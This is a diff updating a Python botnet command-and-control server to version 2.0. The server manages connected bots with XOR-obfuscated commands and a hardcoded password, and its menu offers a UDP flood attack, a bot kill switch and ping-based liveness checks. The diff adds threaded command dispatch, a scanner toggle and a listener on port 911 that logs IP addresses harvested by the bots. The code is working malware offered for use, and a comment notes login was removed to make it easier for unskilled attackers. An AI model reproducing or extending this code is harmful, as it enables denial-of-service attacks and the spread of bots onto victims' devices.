@@ -2,6 +2,7 @@
 # -*- coding: UTF-8 -*-
 #Code by LeeOn123
 #Created at 16/7/2019
+#Updaed at 9/1/2020
 #############################################################
 #        d8888                                              #
 #       d88888                                              #
@@ -15,7 +16,7 @@
 #                     Y8b d88P                              #
 #                      "Y88P"                               #
 #===========================================================#
-#                   ~ version 1.0 ~                         #
+#                   ~ version 2.0 ~                         #
 #############################################################
 import socket
 import threading
@@ -23,7 +24,7 @@ import os
 import time
 import sys
 import base64 as b64
-
+shutdown= False
 key= "asdfghjkloiuytresxcvbnmliuytf"#xor key
 
 if len(sys.argv)<=1:
@@ -33,20 +34,31 @@ if len(sys.argv)<=1:
 b = int(sys.argv[1])
 
 socketList = []
+def sent_command(count,dead,data,sock):
+	try:
+		sock.settimeout(1)
+		sock.send(data.encode())
+		count.append(".")
+	except:
+		sock.close()
+		socketList.remove(sock)#del error connection
+		dead.append(".")
 def sendCmd(cmd):#Send Commands Module
 	print('[*]Command sent!!!')#debug
 	print(cmd)
 	data = xor_enc(cmd,key)#encode
-	count = 0
+	count = []
+	dead = []
+	th_list = []
 	for sock in socketList:
-		try:
-			sock.settimeout(1)
-			sock.send(data.encode())
-			count+=1
-		except:
-			sock.close()
-			socketList.remove(sock)#del error connection
-			print("[!] A bot offline")
+		th = threading.Thread(target=sent_command,args=(count,dead,data,sock))
+		th.start()
+		th_list.append(th)
+	for th in th_list:
+		th.join()
+	count = len(count)
+	dead = len(dead)
+	print("[!] "+str(dead)+" bots offline")
 	print(str(count)+" bots got the command")
 	global so
 	so.send((str(count)+" bots exec the command\r\n").encode())
@@ -55,19 +67,25 @@ def sendCmd(cmd):#Send Commands Module
 
 def scan_device():#scan online device
 	print('scanning Online bot')
+	dead = 0
 	for sock in socketList:
 		try:
 			sock.settimeout(1)
 			sock.send(xor_enc("ping",key).encode())#check connection
-			print("ping")
+			#print("ping")
 			sock.settimeout(2)
-			pong = sock.recv(1024).decode()
-			if xor_dec(pong,key) == "pong":
-				print("pong")
-			else:
-				sock.close()
-				socketList.remove(sock)
-				print("[!] A bot offline")
+			try:
+				pong = sock.recv(1024).decode()
+				if xor_dec(pong,key) == "pong":
+					#print("pong")
+					pass
+				else:
+					sock.close()
+					socketList.remove(sock)
+					dead+= 1
+				print("[!] "+str(dead)+" bots offline")
+			except:
+				print("[!] The bot died")
 		except:
 			socketList.remove(sock)#del error connection
 			print("[!] A bot offline")#debug
@@ -86,12 +104,12 @@ def handle_bot(sock,socketList):
 		try:
 			sock.settimeout(1)
 			sock.send(xor_enc("ping",key).encode())#keepalive and check connection
-			print("ping")
+			#print("ping")
 			sock.settimeout(2)
 			pong = sock.recv(1024).decode()
 			if xor_dec(pong,key) == "pong":
-				print("pong")
-				time.sleep(60)#check connection every min
+				#print("pong")
+				time.sleep(15)#check connection every 15 seconds
 			else:
 				try:
 					sock.close()
@@ -111,13 +129,15 @@ def handle_bot(sock,socketList):
 
 def waitConnect(sock,addr):
 	try:
-		passwd = sock.recv(1024).decode()
-		if passwd == "UEBXUQ==" :#1337 after encode
-			if sock not in socketList:
-				socketList.append(sock)
-				print("[!] A bot Online "+ str(addr)) #message
-				handle_bot(sock,socketList)
-		else:
+		data = sock.recv(1024)#support telnet
+		try:
+			passwd = data.decode()
+			if passwd == "UEBXUQ==" :#1337 after encode
+				if sock not in socketList:
+					socketList.append(sock)
+					print("[!] A bot Online "+ str(addr)) #message
+					handle_bot(sock,socketList)
+		except:
 			#removed Login code, more easy for skid
 			#If u are using putty pls use raw mode to connect,
 			#If connected, there will not show anything on screen
@@ -206,6 +226,7 @@ def Commander(sock):#cnc server
 				sock.send('  UDP  Flood: !udp  host port threads size\r\n\r\n'.encode())#udp flood
 				sock.send('    !stop    : stop attack\r\n'.encode())
 				sock.send('    !kill    : kill all the bots\r\n'.encode())
+				sock.send('    !scan 1/0: enable/disable scanner\r\n'.encode())
 				sock.send('    bots     : count bot\r\n'.encode())
 				sock.send('    scan     : check online connection\r\n'.encode())#check connecton status, if some offline or timeout will delete them form bot list.
 				sock.send('    clear    : Clear screen\r\n'.encode())
@@ -225,9 +246,31 @@ def Commander(sock):#cnc server
 				sock.send('Shutdown\r\n'.encode())
 				sock.close()
 				print("shutdown from remote command")
+				global shutdown
+				shutdown = True
 				sys.exit()
 
+def listen_scan():
+	lis = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	lis.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
+	lis.bind(('0.0.0.0',911))
+	lis.listen(1024)
+	while 1:
+		s, addr = lis.accept()
+		tmp = s.recv(1024).decode()
+		#print("Recevied something "+str(tmp))
+		try:
+			data = xor_dec(tmp,key)
+			print("Recevied scanned ip: "+data)
+			with open("scanned.txt","a") as fd:
+				fd.write(data+"\r\n")
+				fd.close()
+		except:
+			pass
+
+
 def main():
+	threading.Thread(target=listen_scan,daemon=True).start()
 	global s
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
@@ -236,8 +279,7 @@ def main():
 	s.listen(1024)
 	while True:
 		sock, addr = s.accept()
-		th = threading.Thread(target=waitConnect,args=(sock,addr),daemon=True)
-		th.start()
+		threading.Thread(target=waitConnect,args=(sock,addr),daemon=True).start()
 
 def xor_enc(string,key):
     lkey=len(key)
@@ -266,4 +308,7 @@ def xor_dec(string,key):
     return "".join( string )
 
 if __name__ == '__main__':
-	main()
+	threading.Thread(target=main,daemon=True).start()
+	while 1:
+		if shutdown:
+			sys.exit()
